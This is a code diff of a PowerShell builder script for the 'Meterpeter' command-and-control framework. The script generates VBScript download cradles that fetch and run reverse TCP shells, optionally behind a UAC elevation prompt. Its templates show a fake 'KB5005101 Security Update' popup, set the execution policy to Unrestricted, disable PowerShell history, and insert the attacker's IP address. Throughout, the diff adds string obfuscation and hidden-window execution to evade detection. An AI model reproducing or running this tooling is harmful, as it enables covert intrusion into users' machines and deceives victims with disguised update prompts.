@@ -6,12 +6,12 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: @Meterpeter C2 v2.10.14
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.2.15
+   PS cmdlet Dev version: v1.2.16
 
 .DESCRIPTION
    Cmdlet to create download_crandle.vbs that allow @Meterpeter C2 v2.10.14
    users to create VBS download crandles to download\execute rev tcp shells
-   in background process ( orphan ) with or without UAC elevation privileges.
+   in background process ( orphan ) with or without [U]AC elevation privs.
 
 .NOTES
    If invoked -action 'download' then cmdlet creates Download_crandle.vbs
@@ -24,14 +24,11 @@
    with UAC elevation function, If invoked -UACElevation 'false' then cmdlet
    creates Download_crandle.vbs without the UAC elevation function technic.
 
-   Remark: The UAC elevation function spawns an UAC GUI to user at runtime
-   asking to run the application with 'administrator' token privileges.
-
-   Remark: This cmdlet obfuscates crandle.vbs API's calls evertime thats
-   executed to allow for crandle signature modify everytime its created.
+   Remark: The UAC elevation function spawns an [U]AC GUI to user at runtime
+   asking it to run the application with 'administrator' token privileges.
 
 .Parameter Action
-   Accepts arguments: download,fileless,compile (default: download)
+   Accepts arguments: download, fileless, compile (default: download)
 
 .Parameter UACElevation
    Accepts arguments: true, false (default: false)
@@ -53,19 +50,19 @@
 
 .EXAMPLE
    PS C:\> .\crandle_builder.ps1 -UACElevation 'true'
-   creates 'Download_crandle.vbs' with UAC elevation function
+   creates 'Download_crandle.vbs' with [U]AC elevation function
 
 .EXAMPLE
    PS C:\> .\crandle_builder.ps1 -UACElevation 'false'
-   creates 'Download_crandle.vbs' without the UAC elevation function
+   creates 'Download_crandle.vbs' without the [U]AC elevation function
 
 .EXAMPLE
    PS C:\> .\crandle_builder.ps1 -UACElevation 'false' -vbsname "MineDownloader.vbs"
-   creates 'MineDownloader.vbs' without the UAC elevation function technic
+   creates 'MineDownloader.vbs' without the [U]AC elevation function technic
 
 .EXAMPLE
    PS C:\> .\crandle_builder.ps1 -action 'fileless' -UACElevation 'true'
-   creates 'Download_crandle.vbs' (FileLess payload exec) with UAC elevation
+   creates 'Download_crandle.vbs' (FileLess payload exec) with [U]AC elevation
 
 .EXAMPLE
    PS C:\> .\crandle_builder.ps1 -action 'fileless' -Technic "two"
@@ -117,7 +114,7 @@
 $IPATH = (Get-Location).Path.ToString()
 $ErrorActionPreference = "SilentlyContinue"
 $StrLength = (Get-Random -Maximum 8 -Minimum 3)
-#Disable Powershell Command Logging for current session.
+## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $Rand = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_}) # Only Random letters!
 $Apii = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_}) # Only Random letters!
@@ -127,11 +124,11 @@ $TokenAuth = Get-Random -Minimum 900 -Maximum 1300
 
 If($Action -iNotMatch '^(download|fileless|compile)$')
 {
-   write-host "`n*" -ForegroundColor Red -NoNewline;
-   write-host " Wrong Parameter input [ " -ForegroundColor DarkGray -NoNewline;
-   write-host "-action '$Action'" -ForegroundColor Red -NoNewline;
-   write-host " ]" -ForegroundColor DarkGray;
-   exit #Exit @crandle_builder
+   write-host "`n*" -ForegroundColor Red -NoNewline
+   write-host " Wrong Parameter input [ " -ForegroundColor DarkGray -NoNewline
+   write-host "-action '$Action'" -ForegroundColor Red -NoNewline
+   write-host " ]" -ForegroundColor DarkGray
+   exit #Exit crandle_builder
 }
 
 
@@ -149,14 +146,14 @@ If($Egg -ieq "false")
       executed ( without @Meterpeter C2 v2.10.14 ) to create crandles localy.
    #>
 
-   #Get Local host adress to confing crandles (manual execution)
+   ## Get Local host adress to confing crandles (manual execution)
    $Local_Host = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
    $FirstRange = $Local_Host[0,1,2,3,4] -join ''                          # 192.1   - COLOMBO
    $SeconRange = $Local_Host[5,6,7,8] -join ''                            # 68.1    - VIRIATO
    $TrithRange = $Local_Host[9,10,11,12,13,14,15,16,17,18,19,20] -join '' #.72
    $LastRanges = "$TrithRange" + ":" + "$HttpServerPort" -join ''         #.72:8087 - NAVIGATOR
 
-   #Dispaly OnScreen ( CmdLet Manul execution )
+   ## Dispaly OnScreen ( CmdLet Manul execution )
    write-host "`n*" -ForegroundColor Green -NoNewline
    write-host " Creating '" -ForegroundColor DarkGray -NoNewline
    write-host "$VbsName" -ForegroundColor Green -NoNewline
@@ -184,7 +181,7 @@ If($Action -ieq "download")
       function and auto-deletes the crandle downloader in the end.
    #>
 
-#Deobfuscating strings ( download technics ) at runtime
+## Deobfuscating strings ( download technics ) at runtime
 $TechnicDefault_Tmp = $TechnicDefault_Tmp -replace '@!','w' -replace '#','e' -replace '&%','s'
 
 $UserLand = @("'
@@ -271,43 +268,43 @@ ElseIf($Action -ieq "fileless")
       Helper - Create FileLess download crandles (payload does not touch disk)
 
    .NOTES
-      This function creates crandles with or without UAC elevation function.
-      Remark: objShell.Run() replaced by objShell.Exec() to evade detection.
+      This function creates crandles with or without [U]AC elevation function.
+      Remark: objShell.Ru`n() replaced by objShell.E`xec() to evade detection.
    #>
 
 
 If($Technic -ieq "two" -or $Technic -eq 2)
 {
    $TechnicNumber = "2"
-   #Deobfuscating strings ( download technics ) at runtime
+   ## Deobfuscating strings ( download technics ) at runtime
    $CrandleCmdLine = $TechnicFileLessTwo -replace '@!','w' -replace '#','e' -replace '&%','s'
 }
 ElseIf($Technic -ieq "three" -or $Technic -eq 3)
 {
    $TechnicNumber = "3"
-   #Deobfuscating strings ( download technics ) at runtime
+   ## Deobfuscating strings ( download technics ) at runtime
    $CrandleCmdLine = $TechnicFileLessTre -replace '@!','w' -replace '#','e' -replace '&%','s'
 }
 ElseIf($Technic -ieq "four" -or $Technic -eq 4)
 {
    $TechnicNumber = "4"
-   #Deobfuscating strings ( download technics ) at runtime
+   ## Deobfuscating strings ( download technics ) at runtime
    $CrandleCmdLine = $TechnicFileLessXml -replace '@!','w' -replace '#','e' -replace '&%','s'
 }
 Else
 {
    $TechnicNumber = "1"
-   #Deobfuscating strings ( download technics ) at runtime
+   ## Deobfuscating strings ( download technics ) at runtime
    $CrandleCmdLine = $TechnicFileLessOne -replace '@!','w' -replace '#','e' -replace '&%','s'
 }
 
 If($Egg -ieq "false")
 {
-   #Dispaly OnScreen in case its not @Meterpeter exec
-   write-host "*" -ForegroundColor Green -NoNewline;
-   write-host " Using payload fileless technic..[Id:" -ForegroundColor DarkGray -NoNewline;
-   write-host "$TechnicNumber" -ForegroundColor Green -NoNewline;
-   write-host "]" -ForegroundColor DarkGray;
+   ## Dispaly OnScreen in case its not @Meterpeter exec
+   write-host "*" -ForegroundColor Green -NoNewline
+   write-host " Using payload fileless technic..[Id:" -ForegroundColor DarkGray -NoNewline
+   write-host "$TechnicNumber" -ForegroundColor Green -NoNewline
+   write-host "]" -ForegroundColor DarkGray
 }
 
 
@@ -321,18 +318,17 @@ $UserLand = @("'
 
 '''''''''''''''''''''
 ' Vars
-dIm $Apii,Cmd,Layback,fdx,ttl
-ttl=`"I@`":InvokeMe=rEpLaCe(ttl, `"@`", `"EX`")
-$Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
-Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
+dIm $Apii,Cmd,MicroStore,Restricted,visible
+$Apii = `"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
+Restricted = StrReverse(`"detcirtseRnU`")
+MicroStore = rEpLaCe($Apii, `"@!`", `"`")
+Cmd = rEpLaCe(MicroStore, `":007:`", `"`")
+visible = false
 
 '''''''''''''''''''''
 ' HELP - GENERAL
-set ObjSSLProvider = CreateObject(`"Wscript.Shell`")
-CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161 This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
-
-ObjSSLProvider.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
-ObjSSLProvider.Exec(`"$CrandleCmdLine`")
+CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES, LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 4, `"KB5005101 21H1 - Securit Update`", 1
+CreateObject(`"Wscript.Shell`").run `"cmd /R echo Y|Powershell Set-ExecutionPolicy `"+Restricted+`" -Scope CurrentUser && $CrandleCmdLine`", visible
 WScript.Quit")
 
 
@@ -346,26 +342,21 @@ $AutoElevation = @("'
 
 '''''''''''''''''''''
 ' Vars
-dIm $gUid,CookieAuth,AuthToken,$Apii,Cmd,Layback,fdx,ttl
-AuthToken = WScript.FullName:$gUid = StrReverse(`"sanur`")
-ttl=`"I@`":InvokeMe=rEpLaCe(ttl, `"@`", `"EX`")
+dIm $gUid,Cookie_AuthKey,SSLToken,$Apii,Cmd,MicroStore
 $Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
-Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
+SSLToken = WScript.FullName:Cookie_AuthKey = WScript.ScriptFullName
+MicroStore = rEpLaCe($Apii, `"@!`", `"`"):$gUid = StrReverse(`"sanur`")
+Cmd = rEpLaCe(MicroStore, `":007:`", `"`"):visible = false
 
-If WScript.Arguments.length = 0 Then
-   CookieAuth = WScript.ScriptFullName
-   Set ObjTerminal = CreateObject(`"Shell.Application`"):Wscript.Sleep($TokenAuth)
-   ObjTerminal.ShellExecute AuthToken, Chr(34) & CookieAuth & Chr(34) & `" /debug`", `"`", $gUid
+If WScript.Arguments.length = visible Then
+   CreateObject(`"Shell.Application`").ShellExecute SSLToken, Chr(34) & Cookie_AuthKey & Chr(34) & `" /help`", `"`", $gUid
    WScript.Quit
 End If
 
 '''''''''''''''''''''
 ' HELP - GENERAL
-set ObjMicrosoftDisclamer = CreateObject(`"Wscript.Shell`")
-CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161 This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
-
-ObjMicrosoftDisclamer.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
-ObjMicrosoftDisclamer.Exec(`"$CrandleCmdLine`")
+CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES, LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 4, `"KB5005101 21H1 - Security Update`", 1
+CreateObject(`"wscript.shell`").run `"cmd /R echo Y|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser && $CrandleCmdLine`", visible
 WScript.Quit")
 
 
@@ -444,29 +435,29 @@ ElseIf($Action -ieq "Compile")
    Helper - Creates VBS that can be compiled to EXE later
 
 .NOTES
-   This vbs only uses fileless technic n3
+   This vbs only uses fileless technics
 #>
 
 
-#Deobfuscating strings ( download technics ) at runtime
+## Deobfuscating strings ( download technics ) at runtime
 If($Technic -ieq "two" -or $Technic -eq 2)
 {
-   #Deobfuscating strings ( download technics ) at runtime
+   ## Deobfuscating strings ( download technics ) at runtime
    $CrandleCmdLine = $TechnicFileLessTwo -replace '@!','w' -replace '#','e' -replace '&%','s'
 }
 ElseIf($Technic -ieq "three" -or $Technic -eq 3)
 {
-   #Deobfuscating strings ( download technics ) at runtime
+   ## Deobfuscating strings ( download technics ) at runtime
    $CrandleCmdLine = $TechnicFileLessTre -replace '@!','w' -replace '#','e' -replace '&%','s'
 }
 ElseIf($Technic -ieq "four" -or $Technic -eq 4)
 {
-   #Deobfuscating strings ( download technics ) at runtime
+   ## Deobfuscating strings ( download technics ) at runtime
    $CrandleCmdLine = $TechnicFileLessXml -replace '@!','w' -replace '#','e' -replace '&%','s'
 }
 Else
 {
-   #Deobfuscating strings ( download technics ) at runtime
+   ## Deobfuscating strings ( download technics ) at runtime
    $CrandleCmdLine = $TechnicFileLessOne -replace '@!','w' -replace '#','e' -replace '&%','s'
 }
 
@@ -490,7 +481,7 @@ Sub Main
 end sub
 End Module")
 
-   #Build crandle VBS that meterpeter compiles it to EXE
+   ## Build crandle VBS that meterpeter compiles it to EXE
    echo $VBStoExe|Out-File "$VbsName" -Encoding string -Force
 
    If($Egg -ieq "false")
@@ -508,7 +499,8 @@ End Module")
       write-host "*" -ForegroundColor Green -NoNewline
       write-host " Compile: " -NoNewline
       $CrandleExeName = $VbsName -replace '.vbs','.exe'
-      write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe /nologo /quiet /target:exe /out:`"$pwd\${CrandleExeName}`" `"$pwd\$VbsName`" /platform:anyCPU`n" -ForegroundColor DarkYellow
+      $OutraCoisaQueNaoGosto = "C:\W@i£nd£o@ws\@Mi£cr@oso£ft.£N@E£T\F@r£am@ew£ork\v£4.@0.3£0@3£1@9\v£b@c.e£x@e" -replace '(@|£)',''
+      write-host "$OutraCoisaQueNaoGosto /nologo /quiet /target:exe /out:`"$pwd\${CrandleExeName}`" `"$pwd\$VbsName`" /platform:anyCPU`n" -ForegroundColor DarkYellow
    }
 
    Exit
@@ -517,17 +509,17 @@ Else
 {
    write-host ""
    write-host "[error] Wrong argument input: $Action" -ForegroundColor Red -BackgroundColor Black
-   Get-Help .\crandle_builder.ps1 -full;exit #Exit @Crandle_Builder - Trigger Get-Help function!
+   Get-Help .\crandle_builder.ps1 -full;exit #Exit Crandle_Builder - Trigger Get-Help function!
 }
 
 
 If($UACElevation -ieq "True")
 {
-   #Build crandle with UAC elevation
+   ## Build crandle with [U]AC elevation
    echo $AutoElevation|Out-File "$VbsName" -Encoding string -Force
    If($Egg -ieq "false")
    {
-       #Replace the attacker ip addr (obfuscated\split) on vbs template
+       ## Replace the attacker ip addr (obfuscated\split) on vbs template
        ((Get-Content -Path "$VbsName" -Raw) -Replace "VIRIATO","$SeconRange")|Set-Content -Path "$VbsName"
        ((Get-Content -Path "$VbsName" -Raw) -Replace "COLOMBO","$FirstRange")|Set-Content -Path "$VbsName"
        ((Get-Content -Path "$VbsName" -Raw) -Replace "NAVIGATOR","$LastRanges")|Set-Content -Path "$VbsName"   
@@ -535,11 +527,11 @@ If($UACElevation -ieq "True")
 }
 Else
 {
-   #Build crandle without UAC elevation
+   ## Build crandle without [U]AC elevation
    echo $UserLand|Out-File "$VbsName" -Encoding string -Force
    If($Egg -ieq "false")
    {
-       #Replace the attacker ip addr (obfuscated\split) on vbs template
+       ## Replace the attacker ip addr (obfuscated\split) on vbs template
        ((Get-Content -Path "$VbsName" -Raw) -Replace "VIRIATO","$SeconRange")|Set-Content -Path "$VbsName"
        ((Get-Content -Path "$VbsName" -Raw) -Replace "COLOMBO","$FirstRange")|Set-Content -Path "$VbsName"
        ((Get-Content -Path "$VbsName" -Raw) -Replace "NAVIGATOR","$LastRanges")|Set-Content -Path "$VbsName"  
@@ -550,34 +542,34 @@ Else
 If($Egg -ieq "false")
 {
    Start-Sleep -Milliseconds 500
-   #Make sure crandle.vbs was successfuly created ...
+   ## Make sure crandle.vbs was successfuly created ...
    If(Test-Path -Path "$VbsName" -EA SilentlyContinue)
    {
-      #Dispaly OnScreen in case its not @Meterpeter exec
-      write-host "*" -ForegroundColor Green -NoNewline;
-      write-host " Done, Crandle Created, Exiting..[" -ForegroundColor DarkGray -NoNewline;
-      write-host "OK" -ForegroundColor Green -NoNewline;
-      write-host "]`n`n" -ForegroundColor DarkGray;
+      ## Dispaly OnScreen in case its not @Meterpeter exec
+      write-host "*" -ForegroundColor Green -NoNewline
+      write-host " Done, Crandle Created, Exiting..[" -ForegroundColor DarkGray -NoNewline
+      write-host "OK" -ForegroundColor Green -NoNewline
+      write-host "]`n`n" -ForegroundColor DarkGray
 
       Start-Sleep -Milliseconds 700
-      #Print OnScreen the contents of crandle.vbs
+      ## Print OnScreen the contents of crandle.vbs
       Get-Content -Path "$VbsName" -EA SilentlyContinue|Select-Object -SkipLast 1
       Start-Sleep -Milliseconds 800
 
-      write-host "*" -ForegroundColor Green -NoNewline;
-      write-host " Storage: '" -ForegroundColor DarkGray -NoNewline;
-      write-host "${IPATH}\${VbsName}" -ForegroundColor Green -NoNewline;
-      write-host "' [" -ForegroundColor DarkGray -NoNewline;
-      write-host "OK" -ForegroundColor Green -NoNewline;
-      write-host "]" -ForegroundColor DarkGray;
+      write-host "*" -ForegroundColor Green -NoNewline
+      write-host " Storage: '" -ForegroundColor DarkGray -NoNewline
+      write-host "${IPATH}\${VbsName}" -ForegroundColor Green -NoNewline
+      write-host "' [" -ForegroundColor DarkGray -NoNewline
+      write-host "OK" -ForegroundColor Green -NoNewline
+      write-host "]" -ForegroundColor DarkGray
    }
    Else
    {
-      #Dispaly OnScreen in case its not @Meterpeter exec
-      write-host "*" -ForegroundColor Red -NoNewline;
-      write-host " Fail to create create Crandle..[" -ForegroundColor DarkGray -NoNewline;
-      write-host "FAIL" -ForegroundColor Red -NoNewline;
-      write-host "]" -ForegroundColor DarkGray;
+      ## Dispaly OnScreen in case its not @Meterpeter exec
+      write-host "*" -ForegroundColor Red -NoNewline
+      write-host " Fail to create create Crandle..[" -ForegroundColor DarkGray -NoNewline
+      write-host "FAIL" -ForegroundColor Red -NoNewline
+      write-host "]" -ForegroundColor DarkGray
       exit     
    }
 }
